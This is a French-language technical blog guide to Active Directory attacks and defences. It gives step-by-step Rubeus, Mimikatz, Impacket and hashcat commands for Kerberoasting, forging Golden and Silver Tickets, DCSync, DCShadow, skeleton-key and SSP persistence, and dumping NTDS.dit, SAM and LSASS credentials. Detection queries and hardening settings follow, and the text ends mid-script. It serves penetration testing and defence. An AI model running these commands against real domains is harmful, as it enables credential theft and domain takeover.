---
title: "Attaques Avancées sur Active Directory : Guide Technique Complet 2025"
seoTitle: "Active Directory: Advanced Attack Guide 2025"
seoDescription: "Guide 2025 sur les attaques avancées Active Directory : Kerberoasting, Golden Tickets, DCSync, détection et mitigation"
datePublished: Thu Sep 18 2025 17:40:36 GMT+0000 (Coordinated Universal Time)
cuid: cmfpp5ad4000102laaa1oh18j
slug: attaques-avancees-sur-active-directory-guide-technique-complet-2025
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1758217137996/0f3fc925-8684-4e65-9fc8-d05bdc236f67.png
ogImage: https://cdn.hashnode.com/res/hashnode/image/upload/v1758217213426/10c7b2e7-26d7-44ea-8f5f-023e7e431734.png
tags: hacking, active-directory, penetration-testing, cybersecurity-1

---

## Kerberoasting, ASREPRoasting, Golden/Silver Tickets, DCSync et Techniques de Persistance

Les environnements Active Directory (AD) représentent la cible privilégiée des attaquants modernes en raison de leur rôle central dans l'authentification et l'autorisation des entreprises. En 2025, les attaques contre AD ont augmenté de 42%, avec plus de 90% des entreprises du Fortune 1000 utilisant cette infrastructure critique. Cette réalité fait des techniques post-exploitation contre Active Directory une menace existentielle pour les organisations contemporaines.

Active Directory agit comme le **"trousseau de clés principal"** de l'environnement informatique d'une entreprise. Une fois compromis, il permet aux attaquants de s'authentifier comme n'importe quel utilisateur, voler des fichiers sensibles, désactiver les outils de sécurité et créer des comptes administrateurs cachés. Les recherches récentes montrent que les compromissions d'Active Directory jouent un rôle dans presque tous les incidents de ransomware majeurs, y compris la cyberattaque catastrophique de Change Healthcare en 2024.

Ce guide technique détaille les mécanismes avancés d'attaque contre Active Directory, incluant le Kerberoasting et ASREPRoasting avancés, les attaques Golden et Silver Ticket, les techniques DCSync et DCShadow, ainsi que les méthodes de persistance sophistiquées. Nous explorerons également les outils modernes comme Rubeus, Mimikatz et BloodHound, ainsi que les stratégies de détection et de mitigation actualisées pour 2025.

## Fondamentaux de l'Architecture Kerberos et Active Directory

### Protocole Kerberos : Cœur de l'Authentification AD

Le protocole Kerberos constitue l'épine dorsale de l'authentification dans les environnements Active Directory. Ce système de tickets cryptographiques repose sur un modèle de confiance centralisé impliquant trois composants principaux :

**Key Distribution Center (KDC)** : Service centralisé hébergé sur les contrôleurs de domaine, responsable de l'authentification des utilisateurs et de la distribution des tickets. Le KDC maintient une base de données des clés secrètes partagées avec chaque principal du réseau.

**Authentication Server (AS)** : Composant du KDC qui vérifie les identités des utilisateurs et émet les Ticket Granting Tickets (TGT). L'AS valide les informations d'identification initiales et établit la session de confiance.

**Ticket Granting Server (TGS)** : Élément du KDC qui émet les tickets de service spécifiques permettant l'accès aux ressources réseau. Le TGS opère uniquement après validation d'un TGT valide.

### Flux d'Authentification Kerberos

Le processus d'authentification Kerberos suit une séquence précise qui sera exploitée par les attaques détaillées dans ce guide :

1. **Demande d'authentification** : Le client envoie une demande AS-REQ au KDC avec l'identité de l'utilisateur
    
2. **Émission du TGT** : Le KDC vérifie les identifiants et retourne un TGT chiffré avec la clé du compte KRBTGT
    
3. **Stockage du TGT** : Le client stocke le TGT pour les demandes de service ultérieures
    
4. **Demande de service** : Pour accéder à une ressource, le client présente le TGT avec une demande TGS-REQ
    
5. **Émission du ticket de service** : Le TGS valide le TGT et retourne un ticket de service chiffré avec la clé du compte de service
    
6. **Accès à la ressource** : Le client présente le ticket de service au serveur de ressources pour l'authentification finale
    
    ![THE ANATOMY OF KERBEROS AUTHENTICATION (AD BASICS 0x1) | by Hashar Mujahid  | InfoSec Write-ups](https://miro.medium.com/v2/resize:fit:1400/1*iXp8f8wFqCKqWIrHqkQnEQ.png align="left")
    

## Kerberoasting et ASREPRoasting Avancés

![Kerberoasting Attacks: How They Work, Impact, and Prevention](https://cymulate.com/uploaded-files/2024/12/Kerberoasting_diagram.png align="left")

### Mécanismes Approfondis du Kerberoasting

Le Kerberoasting représente une technique post-exploitation sophistiquée qui exploite une faiblesse architecturale fondamentale du protocole Kerberos. Cette attaque cible spécifiquement les comptes de service Active Directory possédant des Service Principal Names (SPN) pour extraire leurs hashes de mots de passe.

**Architecture technique de l'attaque :**

La vulnérabilité exploitée réside dans le fait que les tickets de service Kerberos (TGS) sont chiffrés avec un hash dérivé directement du mot de passe du compte de service ciblé. Cette conception permet à tout utilisateur authentifié du domaine de demander des tickets TGS pour n'importe quel service, créant une surface d'attaque considérable.

**Phase 1 : Énumération avancée des SPN**

L'attaque débute par l'identification méthodique des comptes vulnérables. L'énumération moderne utilise plusieurs techniques sophistiquées :

```powershell
# Énumération LDAP basique
setspn -T DOMAIN -Q */*

# Requête LDAP avancée pour identifier les comptes privilégiés
(&(servicePrincipalName=*)(adminCount=1))

# Identification des comptes avec chiffrement RC4 forcé
(&(servicePrincipalName=*)(msDS-SupportedEncryptionTypes:1.2.840.113556.1.4.804:=4))
```

La recherche d'attributs `AdminCount=1` identifie les comptes membres de groupes privilégiés, représentant des cibles de haute valeur. Ces comptes offrent souvent des privilèges élevés une fois compromis.

**Phase 2 : Extraction et optimisation des tickets**

Les techniques modernes utilisent des outils sophistiqués comme Rubeus pour automatiser l'extraction :

```powershell
# Kerberoasting standard avec Rubeus
Rubeus.exe kerberoast /outfile:hashes.txt

# Kerberoasting ciblé avec filtres avancés
Rubeus.exe kerberoast /spn:MSSQLSvc/sql.domain.com /tgtdeleg

# Force du chiffrement RC4 pour tous les comptes
Rubeus.exe kerberoast /tgtdeleg /outfile:rc4hashes.txt
```

Le paramètre `/tgtdeleg` force l'utilisation du chiffrement RC4 même pour les comptes configurés avec AES, réduisant significativement la complexité du craquage.

**Phase 3 : Optimisation du craquage hors ligne**

Les hashes extraits subissent un craquage optimisé utilisant des techniques avancées:

```bash
# Craquage avec Hashcat et règles personnalisées
hashcat -m 13100 -r best64.rule hashes.txt rockyou.txt

# Attaque par masque pour les politiques de mots de passe connues
hashcat -m 13100 -a 3 hashes.txt ?u?l?l?l?l?l?l?d?d

# Utilisation de GPU cloud pour l'accélération
hashcat -m 13100 --force -O -w 4 hashes.txt wordlist.txt
```

**Détection moderne du Kerberoasting :**

Les techniques de détection 2025 se concentrent sur l'analyse comportementale:

* **Analyse des patterns temporels** : Détection de rafales de demandes TGS depuis un seul endpoint
    
* **Surveillance des types de chiffrement** : Alertes sur les demandes RC4 anormales (Event ID 4769)
    
* **Analyse des comptes ciblés** : Monitoring des demandes pour des comptes de service rarement utilisés
    
* **Corrélation multi-événements** : Analyse des séquences AS-REQ → TGS-REQ inhabituelles
    

### ASREPRoasting : Exploitation des Pré-authentifications Désactivées

![What is AS-REP Roasting? | Semperis Identity Attack Catalog](https://d27a6xpc502mz5.cloudfront.net/wp-content/uploads/images-screenshots/blog/as-rep-roasting/Screenshot_ASREPROAST0-1024x524.png align="left")

L'ASREPRoasting cible une configuration spécifique où la pré-authentification Kerberos est désactivée sur des comptes utilisateur. Cette configuration, souvent utilisée pour la compatibilité avec des applications legacy, crée une vulnérabilité critique.

**Mécanisme technique d'exploitation :**

Lorsque l'attribut `DONT_REQUIRE_PREAUTH` est activé, le KDC retourne directement un message AS-REP contenant des données chiffrées avec le mot de passe de l'utilisateur, sans validation préalable. Cette conception permet à un attaquant de :

1. **Énumérer les comptes vulnérables** sans authentification préalable
    
2. **Demander des AS-REP** pour ces comptes sans fournir d'identifiants
    
3. **Extraire les hashes** des AS-REP pour craquage hors ligne
    

```powershell
# Énumération des comptes ASREPRoastables avec Rubeus
Rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt

# Ciblage spécifique avec noms d'utilisateurs
Rubeus.exe asreproast /user:service_account /format:john

# Énumération via requête LDAP
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
```

**Mitigation avancée :**

* **Audit de configuration** : Identification systématique des comptes avec pré-authentification désactivée
    
* **Politiques de mots de passe renforcées** : Implémentation de mots de passe complexes (25+ caractères) pour ces comptes
    
* **Migration applicative** : Élimination progressive des dépendances legacy nécessitant cette configuration
    

## Attaques Golden et Silver Ticket : Domination Kerberos

### Golden Ticket : Contrôle Total du Domaine

![Golden Ticket - Home Plain and Simple](https://i0.wp.com/homeplainandsimple.com/wp-content/uploads/2021/01/Your-golden-ticket.jpg?resize=1024%2C576&ssl=1 align="left")

L'attaque Golden Ticket représente l'apex de la compromission Active Directory, permettant aux attaquants de forger des Ticket Granting Tickets (TGT) Kerberos authentiques en utilisant le hash du compte KRBTGT. Cette technique post-exploitation accorde un accès quasi-illimité au domaine en contournant entièrement les mécanismes d'authentification normaux.

**Prérequis techniques critiques :**

La réalisation d'une attaque Golden Ticket nécessite plusieurs éléments critiques :

* **Hash NTLM du compte KRBTGT** : Clé maîtresse pour signer tous les TGT du domaine
    
* **SID du domaine** : Identifiant de sécurité unique du domaine cible
    
* **Privilèges administrateur de domaine** : Accès initial pour extraire les informations nécessaires
    

**Processus d'extraction avec Mimikatz :**

```powershell
# Extraction du hash KRBTGT via DCSync
mimikatz.exe "lsadump::dcsync /user:DOMAIN\KRBTGT /csv" "exit"

# Extraction alternative via dump NTDS.dit
mimikatz.exe "lsadump::lsa /patch" "exit"

# Vérification des informations extraites
mimikatz.exe "lsadump::trust /patch" "exit"
```

La commande DCSync exploite les privilèges de réplication pour extraire directement les hashes depuis le contrôleur de domaine sans accès physique au serveur .

**Création et utilisation du Golden Ticket :**

```powershell
# Création d'un Golden Ticket avec privilèges étendus
kerberos::golden /user:AdminFantome /domain:corp.local /sid:S-1-5-21-xxx /krbtgt:hash_ntlm /groups:512,513,518,519,520 /startoffset:-10 /endin:600 /renewmax:10080 /ptt

# Golden Ticket avec sIDHistory pour accès cross-domain
kerberos::golden /user:DomainAdmin /domain:child.corp.local /sid:S-1-5-21-xxx /krbtgt:hash_ntlm /sids:S-1-5-21-root-519 /ptt

# Persistence via ticket sauvegardé
kerberos::golden /user:Persist /domain:corp.local /sid:S-1-5-21-xxx /krbtgt:hash_ntlm /ticket:golden.kirbi
```

Les paramètres `/startoffset` et `/endin` permettent de manipuler les timestamps pour éviter la détection basée sur les horaires anormaux .

**Détection des Golden Tickets :**

Les indicateurs de compromission 2025 incluent :

* **Anomalies temporelles** : Tickets avec des durées de vie inhabituellement longues
    
* **Comptes fantômes** : Authentifications réussies pour des comptes inexistants dans AD
    
* **Patterns géographiques** : Authentifications simultanées depuis des emplacements impossibles
    
* **Analyse des Event ID 4768/4769** : Corrélation des demandes de tickets suspectes
    

### Silver Ticket : Accès Service-Spécifique Furtif

![SILVER TICKET – Forbidden Life](https://lifeisporno.com/cdn/shop/files/LiP_Silver_TICKET_0d895497-6739-4e55-b1b4-4f499fa87ce6.png?v=1685001617 align="left")

Les attaques Silver Ticket forgent des tickets de service (TGS) spécifiques pour accéder à des services individuels sans interaction avec le KDC. Cette approche offre une furtivité supérieure aux Golden Tickets tout en maintenant un accès persistant aux ressources critiques.

**Avantages tactiques des Silver Tickets :**

Le Silver Ticket présente plusieurs avantages opérationnels distincts :

* **Furtivité maximale** : Aucune communication avec les contrôleurs de domaine
    
* **Détection complexe** : Les tickets forgés ressemblent aux authentifications légitimes
    
* **Persistance ciblée** : Maintien de l'accès jusqu'au changement des identifiants du service
    
* **Flexibilité d'utilisation** : Accès granulaire aux services spécifiques sans privilèges domaine
    

**Création de Silver Tickets avancés :**

```powershell
# Silver Ticket pour service SQL avec SPN spécifique
kerberos::golden /user:SQLAdmin /domain:corp.local /sid:S-1-5-21-xxx /target:sql.corp.local /service:MSSQLSvc /rc4:service_hash /ptt

# Silver Ticket pour partage réseau
kerberos::golden /user:FileAdmin /domain:corp.local /sid:S-1-5-21-xxx /target:fileserver.corp.local /service:cifs /aes256:service_aes256_key /ptt

# Silver Ticket pour accès WinRM
kerberos::golden /user:WinRMUser /domain:corp.local /sid:S-1-5-21-xxx /target:server.corp.local /service:HTTP /rc4:computer_hash /ptt
```

La spécification du service via le paramètre `/service` limite l'accès au service exact, réduisant les traces d'audit.

**Analyse comparative Golden vs Silver Tickets :**

| Aspect | Golden Ticket | Silver Ticket |
| --- | --- | --- |
| **Portée d'accès** | Domaine entier | Service spécifique |
| **Hash requis** | KRBTGT | Compte de service/ordinateur cible |
| **Interaction KDC** | Initiale puis autonome | Aucune |
| **Persistance** | Jusqu'à reset KRBTGT (2x) | Jusqu'au changement mot de passe service |
| **Détection** | Événements 4768/4769 visibles | Minimal - Event 4624 uniquement |
| **Privilèges accordés** | Administrateur domaine | Limités au service |
| **Complexité de mise en œuvre** | Élevée | Modérée |

## DCSync : Réplication Malveillante et Exfiltration de Données

### Architecture Technique du DCSync

DCSync représente une technique sophistiquée qui exploite les processus de réplication légitimes d'Active Directory pour exfiltrer l'intégralité de la base de données des mots de passe du domaine. Cette attaque transforme un compte privilégié compromis en contrôleur de domaine virtuel, capable de demander la réplication de données sensibles sans éveiller les soupçons.

**Mécanisme sous-jacent :**

L'attaque utilise le protocole MS-DRSR (Microsoft Directory Replication Service Remote Protocol) avec la fonction `GetNCChanges` pour simuler la réplication entre contrôleurs de domaine. Cette approche contourne les méthodes traditionnelles d'extraction de NTDS.dit en utilisant les canaux de communication natifs d'Active Directory.

**Prérequis d'autorisation critiques :**

DCSync nécessite des privilèges de réplication spécifiques :

* **"Replicating Directory Changes"** (DS-Replication-Get-Changes)
    
* **"Replicating Directory Changes All"** (DS-Replication-Get-Changes-All)
    
* **"Replicating Directory Changes In Filtered Set"** (optionnel pour les domaines avec RODC)
    

Ces privilèges sont accordés par défaut aux groupes Administrators, Domain Admins, Enterprise Admins, et Domain Controllers.

### Implémentation Pratique avec Impacket

**Techniques d'exécution avancées :**

```bash
# DCSync complet avec secretsdump
secretsdump.py -outputfile 'dcsync_full' DOMAIN/USER:PASSWORD@DC_IP

# DCSync ciblé pour utilisateurs spécifiques
secretsdump.py -just-dc-user Administrator DOMAIN/USER:PASSWORD@DC_IP

# DCSync avec Pass-the-Hash
secretsdump.py -outputfile 'dcsync_pth' -hashes :NT_HASH DOMAIN/USER@DC_IP

# DCSync avec Pass-the-Ticket (Kerberos)
export KRB5CCNAME=ticket.ccache
secretsdump.py -k -no-pass -outputfile 'dcsync_kerberos' @DC_HOST

# DCSync via NTLM relay
secretsdump.py -outputfile 'dcsync_relay' 'DOMAIN/USER@DC_IP' -no-pass -k
```

**Utilisation de Mimikatz pour DCSync :**

```powershell
# DCSync basique pour un utilisateur
lsadump::dcsync /user:Administrator

# DCSync pour tous les utilisateurs du domaine
lsadump::dcsync /domain:corp.local /all /csv

# DCSync avec spécification du contrôleur de domaine
lsadump::dcsync /user:CORP\krbtgt /dc:dc1.corp.local

# DCSync pour extraction du hash KRBTGT uniquement
lsadump::dcsync /user:krbtgt
```

### Détection Avancée du DCSync

**Indicateurs de compromission modernes :**

La détection DCSync 2025 se concentre sur plusieurs vecteurs d'analyse :

**Surveillance des événements de réplication :**

* **Event ID 4662** : Audit des accès aux objets avec GUID spécifiques pour DS-Replication-Get-Changes
    
* **Event ID 5136** : Modifications d'objets Active Directory suspectes
    
* **Event ID 4673** : Utilisation de privilèges sensibles
    

**Analyse comportementale :**

* **Patterns temporels anormaux** : Activité de réplication en dehors des fenêtres de maintenance
    
* **Sources non-DC** : Demandes de réplication depuis des machines non-contrôleurs de domaine
    
* **Volume de données** : Pics de trafic de réplication inhabituels
    
* **Comptes utilisateur** : Demandes GetNCChanges depuis des comptes non-système
    

```powershell
# Requête PowerShell pour détecter les permissions suspectes
Get-ADObject -Filter * | Get-ACL | Where-Object {
    $_.Access | Where-Object {
        $_.ObjectType -eq "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2" -or
        $_.ObjectType -eq "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"
    }
}
```

## DCShadow : Persistance par Contrôleur de Domaine Malveillant

### Architecture Conceptuelle du DCShadow

DCShadow représente l'évolution la plus sophistiquée des attaques de persistance Active Directory, permettant aux attaquants de pousser des modifications malveillantes directement dans la base de données AD en se faisant passer pour un contrôleur de domaine légitime. Cette technique exploite le modèle de réplication multi-maître d'Active Directory pour injecter des changements qui semblent provenir d'une source autorisée.

**Différenciation DCShadow vs DCSync :**

Contrairement à DCSync qui extrait des données existantes, DCShadow injecte de nouvelles données malveillantes dans Active Directory :

| Aspect | DCSync | DCShadow |
| --- | --- | --- |
| **Direction** | Pull (extraction) | Push (injection) |
| **Objectif** | Vol de données | Modification/persistance |
| **Détection** | Événements de réplication | Modifications d'objets AD |
| **Impact** | Compromission identifiants | Persistance long terme |
| **Traces** | Logs de réplication | Changements dans AD |

### Processus d'Attaque DCShadow Détaillé

**Phase 1 : Préparation de l'environnement**

Le processus DCShadow débute par l'établissement d'un contrôleur de domaine fictif :

```powershell
# Activation du service mimikatz driver
privilege::debug
!+

# Démarrage du processus DCShadow
lsadump::dcshadow /object:CN=targetuser,CN=Users,DC=corp,DC=local /attribute:primaryGroupID /value:512

# Configuration des SPN nécessaires
lsadump::dcshadow /push
```

**Phase 2 : Enregistrement du DC malveillant**

L'attaquant modifie le schéma Active Directory pour enregistrer la machine compromise comme contrôleur de domaine :

* **Création d'objets dans CN=Configuration** : Enregistrement de la machine dans la partition de configuration
    
* **Modification des SPN** : Attribution des Service Principal Names appropriés (GC/machine-name)
    
* **Établissement de la confiance** : Configuration des relations de réplication avec les DC légitimes
    

**Phase 3 : Injection des modifications malveillantes**

Une fois enregistré, le faux DC peut pousser des modifications vers les contrôleurs légitimes:

```powershell
# Ajout d'un utilisateur au groupe Domain Admins
lsadump::dcshadow /object:CN=backdoor,CN=Users,DC=corp,DC=local /attribute:memberOf /value:CN=Domain Admins,CN=Users,DC=corp,DC=local

# Modification de l'attribut sIDHistory pour privilèges cross-domain
lsadump::dcshadow /object:CN=user,CN=Users,DC=corp,DC=local /attribute:sIDHistory /value:S-1-5-21-root-domain-519

# Création d'un compte de service caché
lsadump::dcshadow /object:CN=svc-persist,CN=Users,DC=corp,DC=local /attribute:servicePrincipalName /value:HTTP/persist.corp.local
```

**Phase 4 : Nettoyage et camouflage**

Pour éviter la détection, l'attaquant supprime les traces de l'opération :

```powershell
# Suppression des SPN créés
lsadump::dcshadow /clean

# Suppression de l'enregistrement DC fictif
# (effectué automatiquement par mimikatz)
```

### Applications Tactiques Avancées

**Persistance via AdminSDHolder :**

DCShadow peut modifier l'objet AdminSDHolder pour maintenir des privilèges permanents :

```powershell
# Modification des ACL AdminSDHolder
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=corp,DC=local /attribute:nTSecurityDescriptor /value:[ACL_MODIFIEE]
```

**Escalade de privilèges cross-domain :**

Exploitation de sIDHistory pour l'accès à travers les domaines de la forest :

```powershell
# Injection de SID Enterprise Admin depuis domaine enfant
lsadump::dcshadow /object:CN=user,CN=Users,DC=child,DC=corp,DC=local /attribute:sIDHistory /value:S-1-5-21-root-519
```

## Techniques de Persistance Avancées

### Persistance par Manipulation des Identités

**Skeleton Key Attack :**

L'injection de clés squelettes dans la mémoire LSASS du contrôleur de domaine permet l'authentification avec un mot de passe maître :

```powershell
# Injection de skeleton key avec Mimikatz
misc::skeleton

# Authentification avec le mot de passe maître
# Mot de passe : "mimikatz"
```

Cette technique maintient l'accès même lors de changements de mots de passe utilisateur, mais nécessite une réinjection après chaque redémarrage du DC.

**Directory Services Restore Mode (DSRM) :**

Exploitation du compte administrateur local DSRM pour maintenir l'accès :

```powershell
# Activation de l'authentification réseau DSRM
reg add HKLM\System\CurrentControlSet\Control\Lsa /v DsrmAdminLogonBehavior /t REG_DWORD /d 2

# Synchronisation du mot de passe DSRM avec un compte du domaine
ntdsutil "set dsrm password" "sync from domain account administrator" quit quit
```

### Custom Security Support Providers (SSP)

L'installation de SSP malveillants intercepte et enregistre les authentifications en temps réel :

```powershell
# Installation d'un SSP personnalisé
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v "Security Packages" /t REG_MULTI_SZ /d "mimilib"

# Copie de la DLL malveillante
copy mimilib.dll C:\Windows\System32\
```

Cette technique capture les mots de passe en clair de tous les utilisateurs s'authentifiant sur le système compromis.

## Extraction NTDS.dit et Techniques de Dumping Avancées

### Méthodes d'Acquisition NTDS.dit Modernes

L'extraction de la base de données Active Directory (NTDS.dit) représente l'objectif ultime de nombreuses campagnes d'attaque. Cette base contient l'intégralité des hashes de mots de passe, des informations utilisateur et de la configuration AD.

**Techniques d'extraction 2025 :**

```powershell
# Utilisation de ntdsutil avec shadow copy
ntdsutil "ac i ntds" "ifm" "create full C:\temp\backup" quit quit

# Shadow copy avec diskshadow
diskshadow /s script.txt
# Contenu de script.txt :
# set context persistent nowriters
# add volume c: alias mydrive
# create
# expose %mydrive% z:

# Extraction via WMI
wmic shadowcopy call create Volume='C:\'
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\temp\

# Utilisation de vssadmin
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\temp\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\system32\config\SYSTEM c:\temp\SYSTEM
```

### Techniques de Dumping LSA et SAM Avancées

**Extraction LSA Secrets :**

Les LSA Secrets contiennent des identifiants critiques pour les comptes de service et les trusts :

```powershell
# Extraction LSA avec Mimikatz
lsadump::secrets

# Extraction via registre
reg save HKLM\SECURITY security.save
reg save HKLM\SAM sam.save  
reg save HKLM\SYSTEM system.save

# Parsing avec secretsdump
secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

**Dumping LSASS moderne avec évasion :**

Les techniques 2025 intègrent l'évasion des protections endpoint :

```powershell
# Dumping direct via MiniDumpWriteDump
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump [PID_LSASS] C:\temp\lsass.dmp full

# Utilisation de ProcDump avec obfuscation
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Technique living-off-the-land avec Task Manager
# Clic droit sur lsass.exe -> "Create dump file"

# Dumping via PowerShell avec évasion AMSI
[System.Reflection.Assembly]::LoadWithPartialName("System.Management.Automation")
```

## BloodHound et Cartographie des Chemins d'Attaque

### Architecture et Fonctionnement de BloodHound

BloodHound révolutionne l'analyse des vulnérabilités Active Directory en utilisant la théorie des graphes pour identifier les relations cachées et les chemins d'attaque dans les environnements AD. Cet outil transforme les données de permissions complexes en visualisations interactives révélant les voies d'escalade de privilèges.

**Composants techniques :**

* **Interface Neo4j** : Base de données graphe stockant les objets AD comme nœuds interconnectés
    
* **Collecteurs de données** : SharpHound (C#) et AzureHound (Azure AD) pour l'énumération
    
* **Interface web Electron** : Application monopage JavaScript pour la visualisation et l'analyse
    

### Collecte de Données Avancée avec SharpHound

**Techniques d'énumération complète :**

```powershell
# Collecte standard complète
SharpHound.exe -c All --outputdirectory C:\temp\

# Collecte avec méthodes spécifiques
SharpHound.exe -c Session,ObjectProps,ACL --outputprefix "corp_enum"

# Collecte stealth avec intervalle
SharpHound.exe -c All --throttle 1000 --jitter 20

# Collecte cross-domain
SharpHound.exe -c All --domain child.corp.local --domaincontroller dc.child.corp.local

# Collecte avec exclusions pour réduire le bruit
SharpHound.exe -c All --excludedcs dc-old.corp.local --skipgcdeconfliction
```

**Paramètres de collecte optimisés :**

* **\--throttle** : Contrôle la vitesse de collecte pour éviter la détection
    
* **\--jitter** : Ajoute une variabilité temporelle aux requêtes
    
* **\--stealth** : Mode furtif réduisant les traces d'audit
    
* **\--skipportcheck** : Contourne les vérifications de connectivité réseau
    

### Analyse des Chemins d'Attaque Critiques

**Requêtes prédéfinies essentielles :**

BloodHound inclut des requêtes préconçues identifiant les vulnérabilités critiques:

1. **"Shortest Paths to Domain Admins"** : Chemins les plus courts vers les privilèges ultimes
    
2. **"List all Kerberoastable Accounts"** : Comptes vulnérables au Kerberoasting
    
3. **"Find AS-REP Roastable users"** : Utilisateurs sans pré-authentification
    
4. **"Find Shortest Paths to Unconstrained Delegation Systems"** : Systèmes avec délégation non contrainte
    
5. **"Find Computers with Unsupported Operating Systems"** : Systèmes obsolètes vulnérables
    

**Chemins d'attaque sophistiqués :**

**Path 1 : Escalade via Reset Password**

L'analyse révèle les chaînes de permissions permettant la réinitialisation de mots de passe:

```php
User1 → (ForceChangePassword) → User2 → (GenericAll) → Group1 → (Member Of) → Domain Admins
```

**Path 2 : Escalade via Group Membership**

Identification des voies d'ajout aux groupes privilégiés:

```php
ServiceAccount → (AddMembers) → ITGroup → (WriteDacl) → AdminGroup → (Member Of) → Domain Admins
```

**Path 3 : Exploitation des ACL WriteDacl**

Chemins utilisant la modification des permissions :

```php
BackupOperator → (WriteDacl) → DC Computer → (HasSession) → Domain Admin → (AdminTo) → All Domain Controllers
```

### Requêtes Cypher Personnalisées

**Identification des comptes de service privilégiés :**

```php
MATCH (u:User)-[:MemberOf*1..]->(g:Group)
WHERE g.objectid ENDS WITH "-512" 
AND u.serviceprincipalnames IS NOT NULL
RETURN u.name, u.serviceprincipalnames, g.name
```

**Détection des délégations dangereuses :**

```php
MATCH (c:Computer)
WHERE c.unconsraineddelegation = true
AND c.enabled = true
RETURN c.name, c.operatingsystem
```

**Analyse des sessions administratives :**

```php
MATCH (c:Computer)-[:HasSession]->(u:User)-[:MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})
RETURN c.name as Computer, u.name as DomainAdmin
```

## Détection et Défenses Avancées 2025

### Architecture de Détection Moderne

La détection des attaques AD avancées nécessite une approche multicouche combinant surveillance comportementale, analyse des logs et corrélation d'événements. L'évolution des techniques d'attaque impose une modernisation des stratégies défensives.

### Indicateurs de Compromission Comportementaux

**Patterns Kerberoasting avancés :**

```powershell
# Requête Splunk pour détection Kerberoasting
index=windows EventCode=4769 
| stats count by src_user, service_name 
| where count > 10 
| eval risk_score = case(count > 50, "HIGH", count > 20, "MEDIUM", "LOW")
```

**Détection DCSync via Event ID 4662 :**

```xml
<!-- Configuration d'audit avancée pour DCSync -->
<AuditPolicy Category="DS Access" Subcategory="Directory Service Access" Setting="Success,Failure"/>

<!-- Règle SIEM pour détection DCSync -->
<Rule>
  <Match>
    <EventID>4662</EventID>
    <Properties>
      <Property Name="ObjectType">1131f6aa-9c07-11d1-f79f-00c04fc2dcd2</Property>
      <Property Name="ObjectType">1131f6ad-9c07-11d1-f79f-00c04fc2dcd2</Property>
    </Properties>
  </Match>
</Rule>
```

### Mesures de Mitigation Architecturales

**Durcissement Kerberos Enterprise :**

```powershell
# Désactivation du chiffrement RC4 via GPO
# Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options
# Network security: Configure encryption types allowed for Kerberos = AES128_HMAC_SHA1, AES256_HMAC_SHA1

# Configuration des politiques de tickets
# Maximum lifetime for user ticket = 10 hours
# Maximum lifetime for user ticket renewal = 7 days
# Maximum lifetime for service ticket = 600 minutes

# Politique de mots de passe renforcée pour comptes de service
# Minimum password length = 28 characters
# Password must meet complexity requirements = Enabled
# Maximum password age = 30 days
```

**Managed Service Accounts (MSA) et Group MSA :**

```powershell
# Création d'un Group Managed Service Account
New-ADServiceAccount -Name "gMSA-SQL" -DNSHostName "sql.corp.local" -PrincipalsAllowedToRetrieveManagedPassword "SQL-Servers" -ManagedPasswordIntervalInDays 30

# Installation sur le serveur cible
Install-ADServiceAccount -Identity "gMSA-SQL"

# Configuration du service avec gMSA
Set-Service -Name "MSSQLSERVER" -StartupType Automatic -Credential "CORP\gMSA-SQL$"
```

**Implémentation du Tiering Model :**

```php
Tier 0 (Domain Controllers, Certificate Authorities)
├── Dedicated admin accounts (T0-DA-*)  
├── Dedicated workstations (T0-WKS-*)
└── Restricted logon policies

Tier 1 (Servers, Applications)
├── Server admin accounts (T1-SA-*)
├── Jump servers (T1-JMP-*)
└── Service accounts with gMSA

Tier 2 (End-user devices)
├── Standard user accounts
├── Local admin rights restrictions
└── Credential Guard enabled
```

### Solutions de Sécurité Endpoint Avancées

**Configuration Microsoft Defender for Identity :**

```json
{
  "SensorConfiguration": {
    "Kerberoasting": "Alert",
    "SuspiciousKerberosTicket": "Alert", 
    "SuspiciousReplication": "Alert",
    "BruteForce": "Alert",
    "PrivilegeEscalation": "Alert"
  },
  "NetworkNameResolutionPoisoning": "Enabled",
  "DnsReconnaissance": "Enabled",
  "DirectoryServicesEnumeration": "Enabled"
}
```

**Règles Attack Surface Reduction (ASR) :**

```powershell
# Blocage du dumping LSASS
Add-MpPreference -AttackSurfaceReductionRules_Ids "9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2" -AttackSurfaceReductionRules_Actions Enabled

# Protection contre le vol d'identifiants Windows
Add-MpPreference -AttackSurfaceReductionRules_Ids "d1e49aac-8f56-4280-b9ba-993a6d77406c" -AttackSurfaceReductionRules_Actions Enabled

# Blocage des exécutables téléchargés depuis clients email/web
Add-MpPreference -AttackSurfaceReductionRules_Ids "01443614-cd74-433a-b99e-2ecdc07bfc25" -AttackSurfaceReductionRules_Actions Enabled
```

### Surveillance Continue et Threat Hunting

**Requêtes KQL pour Azure Sentinel :**

```php
// Détection Golden Ticket basée sur les anomalies temporelles
SecurityEvent
| where EventID == 4768
| extend TicketLifetime = datetime_diff('hour', TimeGenerated, todatetime(TicketExpiration))
| where TicketLifetime > 10
| summarize count() by Account, Computer, TicketLifetime
| where count_ > 1

// Détection Silver Ticket via analyse des authentifications
SecurityEvent  
| where EventID == 4624 and LogonType == 3
| summarize AuthCount = count() by Account, Computer, bin(TimeGenerated, 1h)
| where AuthCount > 50
| join (
    SecurityEvent
    | where EventID == 4769
    | summarize TicketCount = count() by Account, bin(TimeGenerated, 1h)
) on Account, TimeGenerated
| where AuthCount > TicketCount * 10
```

**Scripts PowerShell pour audit proactif :**

```powershell
# Audit des permissions de réplication suspectes
$ReplicationRights = @(
